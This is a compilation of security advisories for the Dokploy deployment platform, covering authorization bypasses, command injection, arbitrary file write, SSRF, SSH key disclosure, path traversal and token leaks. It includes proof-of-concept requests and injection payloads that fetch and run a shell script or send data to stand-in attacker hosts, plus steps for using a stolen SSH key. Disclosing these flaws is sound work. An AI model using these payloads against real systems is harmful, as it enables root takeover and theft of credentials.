advisories.title: Incomplete fix of GHSA-899j-cjwp-v4gw: serviceId lets a member reach any container (Member -> Root) over the docker WebSocket handlers
advisories.summary:
## Summary

Incomplete fix of GHSA-899j-cjwp-v4gw / GHSA-7r6p-v9gw-pwc8.

Since v0.29.13 the container WebSocket handlers (`/docker-container-terminal`, `/docker-container-logs`, `/listen-docker-stats-monitoring`) authorize through `canAccessDockerOverWss()` in `apps/dokploy/server/wss/authorize.ts`. When the client sends a `serviceId` query parameter, the function only checks that the caller has `read` access to **that service** and returns `true`. It never checks that the requested `containerId` (or `appName` for stats) belongs to that service.

Any member who has read access to at least one service - including a service they created themselves - can pass that service's id together with an arbitrary `containerId` and:

- open a root shell in any container on the host or on any remote server, including the Dokploy panel container (`dokploy`), which mounts `/var/run/docker.sock` → root on the Docker host;
- stream logs of any container (other members' applications, `dokploy-postgres`, `dokploy-redis`, Traefik);
- read stats of any application.

This is the same impact as GHSA-899j-cjwp-v4gw ("Member -> Root in Arbitrary Containers"), whose remediation advised resolving the target container to a Dokploy service. The `serviceId` path added in v0.29.13 checks access to a service but never binds the container to it, which reopens the bypass.

## Affected versions

v0.29.13 - v0.30.8 (latest release), and current `canary` (`apps/dokploy/server/wss/authorize.ts` unchanged since v0.30.8).

Verified on a self-hosted v0.30.8 instance.

## Details

`apps/dokploy/server/wss/authorize.ts` (v0.30.8):

```ts
if (serviceId) {
	try {
		await checkServiceAccess(ctx, serviceId, "read");
		return true;          // containerId / appName is never checked
	} catch {
		return false;
	}
}
```

The handlers pass `serviceId` straight from the query string and then operate on the client-supplied `containerId`:

- `docker-container-terminal.ts`: `docker exec` into `<containerId>` with the requested shell
- `docker-container-logs.ts`: `docker container logs <containerId>`
- `docker-stats.ts`: stats for the client-supplied `appName`

`isValidContainerId()` accepts container names, so targets such as `dokploy.1.<task>` or `dokploy-postgres.1.<task>` can be used directly. Task names are visible in logs/stats of the caller's own service and are otherwise easy to derive from the swarm service name.

## Proof of concept

Preconditions: a `member`-role user with default permissions (no Docker permission), an API key for that user, and read access to one service they created - e.g. a Postgres database. Let `OWN_SERVICE_ID` be that service's id (`postgresId`).

Without `serviceId`, the request is correctly denied:

```
GET ws://<panel>:3000/docker-container-terminal?containerId=<dokploy-panel-container>&activeWay=sh
x-api-key: <member key>
→ close 4003 "Not authorized"
```

With the member's own `serviceId`, the same request succeeds and returns a root shell (`# `) inside the panel container (which has the Docker socket mounted):

```
GET ws://<panel>:3000/docker-container-terminal?containerId=<dokploy-panel-container>&activeWay=sh&serviceId=<OWN_SERVICE_ID>
x-api-key: <member key>
→ connection stays open, first frame "# "
```

The same bypass streams logs of the internal database:

```
GET ws://<panel>:3000/docker-container-logs?containerId=<dokploy-postgres-container>&tail=3&serviceId=<OWN_SERVICE_ID>
x-api-key: <member key>
→ Postgres log lines
```

A control request for a container that *does* belong to `OWN_SERVICE_ID` behaves identically, confirming the only thing being checked is access to the service, not ownership of the container.

## Impact

CWE-862 (Missing Authorization). A low-privileged organization member escalates to root on the Docker host and reads/alters every tenant's containers and data. This matches the CVSS of the original advisory: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (Critical).

advisories.title: Local privilege escalation to root: install.sh makes /etc/dokploy world-writable (0777)
advisories.summary:
## Summary

Dokploy's `install.sh` (served from https://dokploy.com/install.sh, source `apps/website/public/install.sh` in the website repo) and the manual-installation docs run `chmod 777 /etc/dokploy`. That directory is bind-mounted into the Dokploy and Traefik containers and holds their configuration (`traefik/`), generated application files, scheduled-task scripts (`schedules/`), and application `.env` files.

## Impact

This is a **local privilege escalation to root** on shared or multi-user hosts. Single-user hosts are not affected because it requires an existing non-root local account on the Dokploy host.

On Linux, write permission on a directory is enough to rename the entries inside it, including root-owned ones. Because `/etc/dokploy` is `0777`, an unprivileged local user can move a root-owned subdirectory aside and put their own directory in its place, which Dokploy and Traefik then consume as trusted configuration.

The most direct path to root: Dokploy writes scheduled-task scripts to `/etc/dokploy/schedules/<app>/script.sh` and later executes them as the root Dokploy process (`packages/server/src/services/schedule.ts` writes the script; `packages/server/src/utils/schedules/utils.ts` runs `bash -c ./script.sh` with the working directory set to that path, for `dokploy-server` schedules). A local non-root user can rename the root-owned `schedules/` directory, recreate `schedules/<app>/script.sh` with their own contents, and have it executed as root on the next scheduled run. The same primitive also allows swapping `traefik/traefik.yml` and other root-consumed configuration.

## Affected

All versions installed via the one-line installer or the manual-installation docs, up to and including the current `install.sh`. Confirmed present on `canary` and on the live `install.sh` as of 2026-11-09 (v0.31.0 was the latest release).

## Reproduction (throwaway container, as root)

```
mkdir -p /etc/dokploy/traefik && chmod 777 /etc/dokploy
echo root-config > /etc/dokploy/traefik/traefik.yml
adduser -D bob
su bob -c "mv /etc/dokploy/traefik /etc/dokploy/old && mkdir /etc/dokploy/traefik && echo bob-config > /etc/dokploy/traefik/traefik.yml"
cat /etc/dokploy/traefik/traefik.yml    # prints bob-config
```

The same move against `schedules/<app>/` yields code execution as root when the scheduler next runs the script.

## Fix

The installer runs as root (it enforces `id -u == 0`) and the Dokploy container also runs as root, so nothing needs the directory world-writable. Lowering it to `0755` keeps root as the sole writer while leaving it readable and traversable. This mirrors the remote-server install path, which already takes ownership with `chown -R $CURRENT_USER:$CURRENT_USER /etc/dokploy` (`packages/server/src/setup/server-setup.ts`) instead of widening permissions.

Pull request (public, since the report below was sent privately first and went unanswered for ~6 weeks): https://github.com/Dokploy/website/pull/225

## Related: application .env files are world-readable (0644)

While hardening the same host I also found that the `.env` files Dokploy writes for applications and compose projects are created under the default umask (0644), so any local user can read every project's secrets (`packages/server/src/utils/builders/utils.ts`, `packages/server/src/utils/builders/compose.ts`). Fix (sets 0600 before writing, tightens existing files on next deploy, with a test): https://github.com/Dokploy/dokploy/pull/5944

## Disclosure timeline

- 2026-09-30: reported privately to contact@dokploy.com per SECURITY.md.
- No acknowledgement received.
- 2026-11-09: re-verified both issues still present; opened the two fix PRs above and filed this advisory.

A critical command injection vulnerability in Dokploy's scheduled task execution allows authenticated attackers to
  execute arbitrary commands within application containers. The `command` parameter in the schedule creation API is
  directly interpolated into shell commands without sanitization, enabling attackers to break out of the intended
  command context and execute malicious code. This can lead to complete container compromise, credential theft, and
  potential host system access.

**Affected File**: `packages/server/src/utils/schedules/utils.ts` (Lines 80-81)

docker exec ${containerId} ${shellType} -c '${command}' >> ${deployment.logPath} 2>> ${deployment.logPath}

User-supplied `command` is directly interpolated into shell commands without escaping.

advisories.title: Authenticated arbitrary file write in Traefik settings allows local and remote file overwrite
advisories.summary:
### Summary
An authenticated user with `traefikFiles:write` permission can supply an arbitrary filesystem path to `settings.updateTraefikFile`, causing Dokploy to write attacker-controlled content to that path. This enables arbitrary file overwrite in the Dokploy runtime environment and, when `serverId` is supplied, arbitrary file overwrite on a managed remote server over SSH.

### Details
The vulnerable route is `settings.updateTraefikFile`:
- /dokploy-0.28.8/apps/dokploy/server/api/routers/settings.ts#L556

Input validation is insufficient:
- /dokploy-0.28.8/packages/server/src/db/schema/user.ts#L159

```ts
export const apiModifyTraefikConfig = z.object({
  path: z.string().min(1),
  traefikConfig: z.string().min(1),
  serverId: z.string().optional(),
});
```

The write sink uses the attacker-controlled path directly:
- /dokploy-0.28.8/packages/server/src/utils/traefik/application.ts#L224

```ts
export const writeTraefikConfigInPath = async (
  pathFile: string,
  traefikConfig: string,
  serverId?: string,
) => {
  const configPath = path.join(pathFile);
  if (serverId) {
    const encoded = encodeBase64(traefikConfig);
    await execAsyncRemote(
      serverId,
      `echo "${encoded}" | base64 -d > "${configPath}"`,
    );
  } else {
    fs.writeFileSync(configPath, traefikConfig, "utf8");
  }
};
```

Two issues are present:
- `path` is not restricted to the Traefik directory.
- `serverId` is accepted by the write route without an organization ownership check before the remote write happens.

The remote execution helper resolves the server and executes the write over SSH:
- /dokploy-0.28.8/packages/server/src/utils/process/execAsync.ts#L142
- /dokploy-0.28.8/packages/server/src/services/server.ts#L37

In contrast, `readTraefikFile` does have a base-path restriction, so this is not a confirmed full arbitrary file read primitive.

### PoC
Tested on Dokploy `v0.28.8`.

Test account used:
- `test@gmail.com / Bounty@1234`

#### Variant 1: local arbitrary file write outside the Traefik directory
1. Log in and obtain a `better-auth.session_token` cookie.
2. Send:

```http
POST /api/trpc/settings.updateTraefikFile?batch=1 HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Cookie: better-auth.session_token=<SESSION_TOKEN>

{"0":{"json":{"path":"/tmp/browser_traefik_write_probe","traefikConfig":"browser-probe-local"}}}
{"0":{"json":{"path":"/etc/dokploy/browser_traefik_write_probe_outside_traefik.txt","traefikConfig":"browser-probe-local-etc"}}}
```

3. Verify inside the Dokploy runtime container:

```bash
docker exec dokploy-audit sh -lc 'ls -l /etc/dokploy/browser_traefik_write_probe_outside_traefik.txt && printf "CONTENT:" && cat /etc/dokploy/browser_traefik_write_probe_outside_traefik.txt'
```

Observed result:
```text
-rw-r--r-- 1 root root 23 ... /etc/dokploy/browser_traefik_write_probe_outside_traefik.txt
CONTENT:browser-probe-local-etc
```

#### Variant 2: remote arbitrary file write
1. Reuse the authenticated browser/session cookie.
2. Send:

```http
POST /api/trpc/settings.updateTraefikFile?batch=1 HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Cookie: better-auth.session_token=<SESSION_TOKEN>

{"0":{"json":{"path":"/audit-marker/browser_traefik_remote_write_probe_non_tmp.txt","traefikConfig":"browser-probe-remote-audit-marker","serverId":"case2server"}}}
```

3. Verify on the managed server:

```bash
docker exec audit-ssh-target sh -lc 'ls -l /audit-marker/browser_traefik_remote_write_probe_non_tmp.txt && printf "CONTENT:" && cat /audit-marker/browser_traefik_remote_write_probe_non_tmp.txt'
```

Observed result:
```text
-rw-r--r-- 1 root root 33 ... /audit-marker/browser_traefik_remote_write_probe_non_tmp.txt
CONTENT:browser-probe-remote-audit-marker
```

Browser-based validation:
- The vulnerability was also replayed from an authenticated browser session on the `Traefik File System` page...

advisories.title: Multiple Command Injection vulnerabilities via Shell String Interpolation
advisories.summary:
## Summary
Multiple command injection vulnerabilities exist in Dokploy where user-controlled input is interpolated directly into shell command strings executed via execAsync/execAsyncRemote. A safe pattern (spawnAsync with array arguments) exists in some code paths but is inconsistently applied.

## Details

### 1. Schedule Command Injection (Remote Path)
File: packages/server/src/utils/schedules/utils.ts:80-81

The LOCAL execution path safely uses spawnAsync with array arguments (line 106-108), but the REMOTE execution path interpolates command directly into a shell string passed to execAsyncRemote via SSH conn.exec().

Input source: schedule.command field via tRPC scheduleRouter.create/update. Schema: z.string() with no sanitization.

### 2. Compose Command Injection
File: packages/server/src/utils/builders/compose.ts:57

Docker command is interpolated directly. The sanitizeCommand() function only trims whitespace and strips surrounding double-quotes - zero protection against shell metacharacters.

### 3. Git URL/Branch Injection
File: packages/server/src/utils/providers/git.ts:81

Both customGitBranch and customGitUrl are interpolated without escaping into git clone commands. Same pattern in gitlab.ts, github.ts, gitea.ts, bitbucket.ts.

### 4. Docker Image Name Injection
File: packages/server/src/utils/providers/docker.ts:24

dockerImage interpolated into docker pull command. Same in libsql.ts, mongo.ts, mariadb.ts, mysql.ts, postgres.ts, redis.ts.

## PoC
Set schedule.command to: `'; curl attacker.com/shell.sh | bash; echo '` targeting a remote server.

## Impact
- Remote Code Execution on host servers and connected remote servers
- Full compromise of all deployed services
- Any authenticated user with project-level permissions can exploit (not admin-only)

## Remediation
1. Replace all shell string interpolation with spawnAsync using array arguments
2. Add strict input validation with allowlists
3. Validate dockerImage against Docker image name spec

advisories.title: OS Command Injection via unsanitized publishDirectory in Nixpacks build pipeline
advisories.summary:
Description:
  ### Summary
  An authenticated user can set the `publishDirectory` field to a value containing shell metacharacters (e.g., `dist;
  curl http://attacker.com/$(id)`). When a Nixpacks deployment is triggered, this value is interpolated directly into a
  shell command executed via `child_process.exec()`, resulting in arbitrary command execution on the host server.

  ### Details
  The vulnerable field is defined in `packages/server/src/db/schema/application.ts`:

  ```typescript
  export const apiSaveBuildType = createSchema
    .pick({ applicationId: true, buildType: true, ... })
    .merge(createSchema.pick({ publishDirectory: true, isStaticSpa: true }))

  publishDirectory accepts any string with no character validation (z.string().optional()).

  During Nixpacks deployment, packages/server/src/utils/builders/nixpacks.ts constructs the following shell command:

  await execAsync(
    `docker cp ${buildContainerId}:/app/${publishDirectory}${isDirectory ? "/." : ""} ${path.join(buildAppDirectory,
  publishDirectory)}`
  )

  execAsync is implemented using child_process.exec() (util.promisify(exec)), which spawns a shell and interprets
  metacharacters such as ;, |, &&, $(), and backticks.

  The field is set via the saveBuildType tRPC procedure in apps/dokploy/server/api/routers/application.ts, which only
  requires create permission on the application - a standard user privilege.

  PoC

  1. Log in to a Dokploy instance and create a project + application
  2. Go to the application's Build settings
  3. Set Build Type to Nixpacks
  4. Set Publish Directory to:
  dist; curl http://<attacker-controlled-host>/$(id)
  5. Save and trigger a deployment
  6. The server makes an outbound request to the attacker's host with the output of id (e.g., uid=0(root))

  To confirm without a live listener, set Publish Directory to:
  dist; id > /tmp/pwned_by_dokploy
  After deployment, verify /tmp/pwned_by_dokploy exists on the host with command output.

  Impact

  Any authenticated user with access to an application can execute arbitrary OS commands on the Dokploy host server.
  Since Dokploy requires access to the Docker socket (equivalent to root), this results in full host compromise -
  including reading secrets, modifying containers, and lateral movement to all managed services

advisories.title: Command Injection via Shell String Interpolation
advisories.summary:
### Summary

Multiple tRPC procedures interpolate user-controlled input directly into shell command strings executed via `execAsync` with `{ shell: "/bin/bash" }`. No shell escaping or input validation is applied. An authenticated member with service access can execute arbitrary commands on the Dokploy host as the daemon process (typically root).

### Details

The following user-controlled fields flow into shell command templates without sanitization:

**1. Database `changePassword` (postgres.ts, mysql.ts, mariadb.ts, mongo.ts)**

The `DATABASE_PASSWORD_REGEX` at `packages/server/src/db/schema/utils.ts` blocks `$`, `!`, `'`, `"`, `\`, `/`, and space, but explicitly permits backtick (`` ` ``) and semicolon (`;`):

```
/^[a-zA-Z0-9@#%^&*()_+\-=[\]{}|;:,.<>?~`]*$/
```

The password is interpolated into a `bash -c "..."` double-quoted string at `apps/dokploy/server/api/routers/postgres.ts:436-456`:

```ts
const command = `
  CONTAINER_ID=$(${containerCmd})
  docker exec "$CONTAINER_ID" psql -U ${databaseUser} -c "ALTER USER \\"${databaseUser}\\" WITH PASSWORD '${password}';"
`;
await execAsync(command, { shell: "/bin/bash" });
```

Backticks trigger command substitution inside double-quoted bash strings.

**2. Backup restore (`backup.restoreBackupWithLogs`)**

`databaseName` is validated as `z.string().min(1)` only at `apps/dokploy/server/api/routers/backup.ts:547`. The value reaches `packages/server/src/utils/restore/utils.ts:5-22`:

```ts
docker exec -i $CONTAINER_ID sh -c "pg_restore -U 'user' -d ${database} -O --clean --if-exists"
```

**3. Volume backup (`volumeBackups.create`)**

`volumeName` and `serviceName` are unrestricted text fields at `packages/server/src/db/schema/volume-backups.ts:116`. They reach `packages/server/src/utils/volume-backups/backup.ts:43-156`:

```ts
docker run --rm -v ${volumeName}:/volume_data ...
docker service inspect ${compose.appName}_${volumeBackup.serviceName}
```

**4. Certificate creation (`certificate.create`)**

`certificatePath` is `z.string().optional()` at `packages/server/src/db/schema/certificate.ts:42`. A user-supplied value overrides the `$defaultFn` and flows to `packages/server/src/services/certificate.ts:32`:

```ts
mkdir -p ${certDir}; echo "${certificateData}" | base64 -d > "${crtPath}"
```

**5. Mount file creation (`mount.create`)**

`filePath` is `z.string().optional()` at `packages/server/src/db/schema/mount.ts:125`. The value flows to `packages/server/src/utils/docker/utils.ts:686,708`:

```ts
mkdir -p ${directory}; echo "..." | base64 -d > "${fullPath}"
```

**6. Custom git URL (`application.saveGitProvider`)**

`customGitUrl` is `z.string()` with no URL validation at `packages/server/src/db/schema/application.ts:506-521`. While `customGitBranch` is now validated by `VALID_BRANCH_REGEX` (fixed in v0.29.3), the URL is not. The value flows to `packages/server/src/utils/providers/git.ts:81`:

```ts
git clone --branch ${customGitBranch} --depth 1 ${customGitUrl} ${outputPath}
```

2. Ensure the Postgres container is running.
3. Send the following request from an authenticated session:

Host: <target>:3000
Content-Type: application/json
Cookie: better-auth.session_token=<session>

{"0":{"json":{"postgresId":"<postgres_id>","password":"`id`"}}}

The `$(...)` syntax is blocked by the regex, but backticks are functionally equivalent for command substitution inside double-quoted bash strings.

advisories.title: Server-Side Request Forgery in AI and Monitoring Endpoints
advisories.summary:
### Summary

Multiple tRPC procedures accept a user-supplied URL and make outbound HTTP requests from the Dokploy server without validating the URL scheme, host, or resolved IP address. Any authenticated member can probe internal network services and access cloud metadata endpoints. On AWS deployments with IMDSv1 enabled, this can lead to IAM credential theft.

### Details

The following tRPC procedures are affected:

**`ai.testConnection` and `ai.getModels`** at `apps/dokploy/server/api/routers/ai.ts:46-176`:

```ts
getModels: protectedProcedure
  .input(z.object({ apiUrl: z.string().min(1), apiKey: z.string() }))
  .query(async ({ input }) => {
    response = await fetch(`${input.apiUrl}/models`, { headers });
  });
```

No URL parsing, scheme allowlist, or private IP rejection is applied. `getProviderName` at `packages/server/src/utils/ai/select-ai-provider.ts:3` is a pure substring router with no security validation.

**`server.getServerMetrics`** at `apps/dokploy/server/api/routers/server.ts:486`:

```ts
const url = new URL(input.url);
const response = await fetch(url.toString(), {
  headers: { Authorization: `Bearer ${input.token}` },
});
```

The `Authorization` header with the caller-supplied token is forwarded to the attacker-controlled URL.

**`user.getContainerMetrics`** at `apps/dokploy/server/api/routers/user.ts:410` follows the same pattern.

These endpoints are protected by `protectedProcedure` or `withPermission("monitoring", "read")`. The `monitoring` resource is in `enterpriseOnlyResources`, and the static-role early-return in `packages/server/src/services/permission.ts:85-90` bypasses the permission check for all default roles (owner, admin, member). Any default member can reach these endpoints.

### PoC

1. Create a default member account in a Dokploy organization.
2. Start a listener on an attacker-controlled host: `python3 -m http.server 80`
3. From the member session, send:

```
POST /api/trpc/ai.testConnection?batch=1 HTTP/1.1
Host: <target>:3000
Content-Type: application/json
Cookie: better-auth.session_token=<member_session>

{"0":{"json":{"apiUrl":"http://<attacker_ip>","apiKey":"","model":"test"}}}
```

4. Response: HTTP 400 with error message:
```
"Failed after 3 attempts. Last error: Unsupported method ('POST')"
```

5. The attacker's listener confirms three inbound POST requests from the Dokploy server.

### Impact

Any authenticated member can use the Dokploy server as an SSRF proxy to scan internal networks, access cloud metadata services (AWS IMDSv1 at 169.254.169.254), and exfiltrate responses. The monitoring endpoints additionally leak the caller-supplied bearer token to the attacker-controlled URL. On cloud deployments, this enables IAM credential theft and potential cloud account takeover.

advisories.title: SSH Private Key Disclosure to Unauthorized Organization Members via server.all and server.one tRPC Endpoints
advisories.summary:
### Summary
Any authenticated organization member can retrieve the full SSH private key for every server in the organization via the server.all and server.one tRPC endpoints, regardless of their role or whether they have been granted SSH or server access. This allows a low-privilege member to compromise the underlying server infrastructure.

### Details
The server.all endpoint (GET /api/trpc/server.all) returns a list of all servers in the organization to any authenticated member. No authorization check verifies that the requesting user has server-level permissions. The response includes server IDs, IP addresses, SSH usernames, ports, and SSH key IDs.
Using a server ID obtained from server.all, the user can call the server.one endpoint (GET /api/trpc/server.one?input={"json":{"serverId":"<id>"}}) which returns the full server object including the associated SSH private key in plaintext via the nested sshKey.privateKey field.
Neither endpoint enforces role-based access control beyond verifying that the user holds a valid session token for the organization. A member with no project assignments, no server access, and no admin privileges can retrieve every server's private key.

### PoC

Prerequisites: A Dokploy instance with at least one server configured and a low-privilege organization member account (no server or SSH access granted).

Step 1 - Enumerate servers:
```
GET /api/trpc/server.all HTTP/1.1
Host: <target>
Cookie: better-auth.session_token=<low-privilege-member-token>
```

Response includes all servers with their serverId values, IP addresses, SSH usernames, and ports.

Step 2 - Retrieve private key:
```
GET /api/trpc/server.one?input=%7B%22json%22%3A%7B%22serverId%22%3A%22<serverId-from-step-1>%22%7D%7D HTTP/1.1
Host: <target>
Cookie: better-auth.session_token=<low-privilege-member-token>
```

Response includes the full sshKey object with the privateKey field containing the complete OpenSSH private key.

Step 3 - Connect to server:
```
echo '<privateKey>' > stolen_key && chmod 600 stolen_key
ssh -i stolen_key <username>@<ipAddress> -p <port>
```

The attacker now has shell access as the configured user (typically root).

### Impact
Any authenticated organization member can steal SSH private keys for all servers managed by the Dokploy instance and gain direct shell access to the underlying infrastructure. This bypasses all role-based access controls within Dokploy. In default configurations where the SSH user is root, this results in full root-level compromise of every managed server. Multi-tenant organizations are particularly at risk, as any member, including those invited with minimal permissions, can access every server in the organization.

advisories.title: Path Traversal & RCE via unzipDrop and Schedules
advisories.summary:
## Information
- **Project:** Dokploy
- **Version:** v0.29.4
- **Severity:** Critical (9.1)
- **Vulnerability Type:** Path Traversal (CWE-22) / RCE

## Description
The `unzipDrop` utility, used for "Drop" deployments, attempts to prevent path traversal but uses a flawed validation mechanism. The `readValidDirectory` function uses a weak regular expression that allows `.` and `/` characters. Furthermore, it validates that the resolved path starts with the base directory `/etc/dokploy`, but it does not restrict the path to the specific application's deployment directory. This allows an attacker to write files anywhere within `/etc/dokploy`, including sensitive locations like the schedules directory.

## Code Analysis
In [packages/server/src/wss/utils.ts](file:///home/veronica/bot/audit/dokploy-audit/dokploy/packages/server/src/wss/utils.ts):
```typescript
export const readValidDirectory = (directory: string, serverId?: string | null) => {
    if (!/^[\w/. :-]{1,500}$/.test(directory)) {
        return false;
    }
    const { BASE_PATH } = paths(!!serverId); // /etc/dokploy
    const resolvedBase = path.resolve(BASE_PATH);
    const resolvedDir = path.resolve(directory);
    return (resolvedDir === resolvedBase || resolvedDir.startsWith(resolvedBase + path.sep));
};
```
In [packages/server/src/utils/builders/drop.ts](file:///home/veronica/bot/audit/dokploy-audit/dokploy/packages/server/src/utils/builders/drop.ts):
```typescript
const fullPath = path.join(outputPath, filePath).replace(/\\/g, "/");
if (!readValidDirectory(fullPath, application.serverId)) { ... }
```
If `filePath` in the ZIP file is `../../../schedules/target-app/script.sh`, `path.join` resolves it to `/etc/dokploy/schedules/target-app/script.sh`. Since this path starts with `/etc/dokploy/`, it passes the check.

## Proof of Concept
1. Prepare a ZIP file containing a malicious script at the path `../../../schedules/[existing-app-name]/script.sh`.
2. Perform a "Drop" deployment using this ZIP file.
3. The server extracts the ZIP and overwrites the schedule script for the target application.
4. When the target application's schedule is next triggered, the malicious script executes on the host.

## Impact
Remote Code Execution. An attacker can overwrite system configurations, hijack other applications, or achieve persistent RCE by manipulating scheduled tasks.

## Remediation
1. **Specific Base Path**: Restrict `readValidDirectory` to the specific application's subdirectory (e.g., `/etc/dokploy/applications/[appName]`) rather than the global `/etc/dokploy`.
2. **Strict Filename Validation**: Sanitize filenames within the ZIP archive to ensure they do not contain path traversal sequences like `..`.
3. **Path Resolution**: Use `path.resolve` on the final path and ensure it remains within the intended `outputPath` using a strict prefix check.

advisories.title: RCE via Command Injection in Schedule appName
advisories.summary:
## Information
- **Project:** Dokploy
- **Version:** v0.29.4
- **Severity:** Critical (10.0)
- **Vulnerability Type:** Command Injection (CWE-77)

## Description
When creating or updating a schedule in Dokploy, the `appName` can be provided by the user. This `appName` is used to construct a directory path that is then used in a shell command (`mkdir -p`) without proper escaping or sanitization. This leads to a Remote Code Execution (RCE) vulnerability.

## Code Analysis
In [packages/server/src/services/schedule.ts](file:///home/veronica/bot/audit/dokploy-audit/dokploy/packages/server/src/services/schedule.ts):
```typescript
const handleScript = async (schedule: Schedule) => {
    const { SCHEDULES_PATH } = paths(!!schedule?.serverId);
    const fullPath = path.join(SCHEDULES_PATH, schedule?.appName || "");

    // ...
    const script = `
         mkdir -p ${fullPath}
         rm -f ${fullPath}/script.sh
         touch ${fullPath}/script.sh
         chmod +x ${fullPath}/script.sh
         echo "${encodedContent}" | base64 -d > ${fullPath}/script.sh
    `;

    if (schedule?.scheduleType === "dokploy-server") {
        await execAsync(script);
    }
    // ...
};
```
The `fullPath` variable, which includes the user-controlled `appName`, is interpolated directly into the `script` string and executed via `execAsync`.

## Proof of Concept
1. Create a new Schedule.
2. Set the `appName` to: `mysched; curl http://attacker.com/$(whoami); #`
3. Save the schedule.
4. The server executes:
   ```bash
   mkdir -p /etc/dokploy/schedules/mysched; curl http://attacker.com/$(whoami); #
   ...
   ```
5. The injected `curl` command executes on the host.

## Impact
Full system compromise. An attacker can execute arbitrary commands on the host system with root-level access (as Dokploy usually runs with high privileges to manage Docker).

## Remediation
1. **Schema Validation**: Enforce a strict regex for `appName` in the `schedules` schema (e.g., `^[a-z0-9-]+$`).
2. **Safe Shell Execution**: Avoid interpolating variables into shell strings. Use argument arrays with `spawn` or a similar safe execution method.
3. **Escaping**: If shell interpolation is unavoidable, use `shell-quote` to escape all variables.

advisories.title: Sensitive Credential Leakage: GitHub Authentication Token (`ghs_`) Exposed in Discord Webhook Payloads
advisories.summary:
### Summary
A sensitive credential exposure vulnerability exists in Dokploy's build notification system. When a build fails (in certain conditions), the application sends a notification to configured Discord webhooks. If a repository is cloned via HTTPS authentication, the Discord webhook payload includes the raw Git remote URL containing the short-lived GitHub App Installation Token (`ghs_`) in plain text. This allows any user or integration with access to the Discord channel or webhook logs to intercept the token and gain unauthorized access to the underlying GitHub repository.

### Details
During the application build process, Dokploy constructs a payload to transmit to an external Discord webhook URL. When logging or summarizing the build status, the application extracts the full Git remote repository URL.

When utilizing GitHub App authentication or automated deployment flows, this URL is constructed using the format:
`https://oauth2:ghs_..._@github.com/owner/repo.git`

The vulnerability stems from a lack of sanitization before sending this string to the external API endpoint (Discord in this case). The application fails to mask or strip the basic authentication fields (oauth2:ghs_...) from the repository URL string inside the notification generator logic, leaking sensitive, active session tokens outside the secure Dokploy server environment.

### PoC
To reproduce the credential leak:
1. Deploy an application on Dokploy using a private GitHub repository connected via GitHub App
2. Configure a Discord Webhook inside the project or application settings to receive notifications for build events.
3. Trigger a manual deploy or a webhook-based build (ensure it fails to trigger that specific notification payload).
4. Check the resulting message received in the Discord channel. Inspect the payload data/embed details containing the "Error Message"
5. The URL will expose the token in plain text:
```
Command execution failed: Command failed:
(set -e;set -e;
rm -rf /etc/dokploy/applications/.../code;
mkdir -p /etc/dokploy/applications/.../code;
echo "Cloning Repo github.com/Spikerko/....git to /etc/dokploy/applications/.../code: ✅";
git clone --branch main --depth 1  https://oauth2:ghs_{...TOKEN...}@github.com/Spikerko/....git /etc/dokploy/applications/.../code --progress;
echo "Applying 1 patch(es)...";
file="/etc/dokploy/applications/.../code/src/index.js"
dir="$(dirname "$file")"
mkdir -p "$dir"
echo "{...some random string of characters i do not understand the purpose of...}
```

### Impact
- **Vulnerability Type:** CWE-532 (Insertion of Sensitive Information into Log File / External Payload)
- **Who is impacted:** All Dokploy users who deploy private GitHub repositories via HTTPS tokens and have enabled external Discord webhook notifications. Dokploy users who deploy private GitHub repositories via HTTPS tokens and have enabled external Discord webhook notifications.
- **Severity:** Medium-High. While `ghs_` tokens are short-lived (typically expiring within 1 hour), they grant appropriate access for the duration of their validity. If the Discord channel is public, shared, or indexed by third-party bots, the repository's intellectual property and source code are entirely compromised during that window.

I did not look at Dokploy's implementation of webhooks, but this might affect other webhook types, not just the Discord one specifically.

Non-admin organisation member can gain root on the host via an unrestricted host bind-mount
advisories.summary:
### Summary
A low-privilege organization member can get root on the Docker host that runs Dokploy. A member who can create a service, but who is denied Docker access (`canAccessToDocker = false`) and has no SSH or Traefik access, can attach a host bind-mount (`type: "bind"`, `hostPath: "/"`) to its own service and deploy it. The resulting container runs as `uid=0(root)` with the entire host filesystem mounted read-write. The `mounts.create` endpoint checks only whether the member may create volumes and manage the service. It does not check whether the member may mount host paths into the container.

### Details
Dokploy defines each tRPC route using a procedure type (`apps/dokploy/server/api/trpc.ts`). A `protectedProcedure` is available to any authenticated user, including a `member`, while an `adminProcedure` requires an owner or admin. Members also have permission flags such as `canCreateServices`, `canAccessToDocker`, and `canAccessToSSHKeys`. Dokploy checks these flags on routes that expose the corresponding features.

`mounts.create` is a `protectedProcedure`. Before creating the mount, it calls `checkServicePermissionAndAccess` (`apps/dokploy/server/api/routers/mount.ts:77`):

```ts
create: protectedProcedure.input(apiCreateMount).mutation(async ({ input, ctx }) => {
    await checkServicePermissionAndAccess(ctx, input.serviceId, { /* ... */ });
    const mount = await createMount(input);
});
```

`checkServicePermissionAndAccess` (`packages/server/src/services/permission.ts:242`) checks the generic `volume:create` permission and whether the member has access to the service. It does not distinguish a Docker-managed volume from a bind-mount of an arbitrary host path. The base member role has `volume:create` permission for services it can access. A member with `canCreateServices` is also automatically granted access to each service it creates, so it passes both checks. The mount schema (`packages/server/src/db/schema/mount.ts`) does not restrict the mount type or host path:

```ts
type: z.enum(["bind", "volume", "file"]),
hostPath: z.string().optional(),
```

The member can therefore create a mount with `type: "bind"` and `hostPath: "/"`. When the service is deployed, Dokploy adds it to the Swarm service as `type=bind src=/ dst=/host ro=false`. The container runs as root with the host filesystem mounted read-write at `/host`. It can read or modify any host file, including `/etc/shadow` and `/var/run/docker.sock`. Either the writable host filesystem or access to the Docker socket is enough to take full control of the host. This path never checks whether the member has Docker, SSH, or Traefik access.

The `compose` router has the same problem. `compose.create` checks whether the member may create a service in the project. `compose.update` and `compose.deploy` check whether the member may manage that compose service. These routes do not inspect the submitted `composeFile` for settings that expose the host. A member can use `privileged: true`, `/:/host`, or a Docker-socket mount to get the same result. This was also confirmed on a live instance (`../pocs/compose_chain.py`).

Fix: require a separate permission for container settings that expose the host. For callers who are not owners or admins, reject `type: "bind"` and any `hostPath` unless the caller has permission to create host mounts. Apply this check to both `mounts.create` and `mounts.update`. Dokploy should also parse compose files before they are created, updated, or deployed. Unless the caller has the required permission, reject host bind-mounts, Docker-socket mounts, `privileged`, added capabilities, host namespaces, devices, and similar settings. Client-side controls and the generic `volume:create` permission are not sufficient.

### PoC

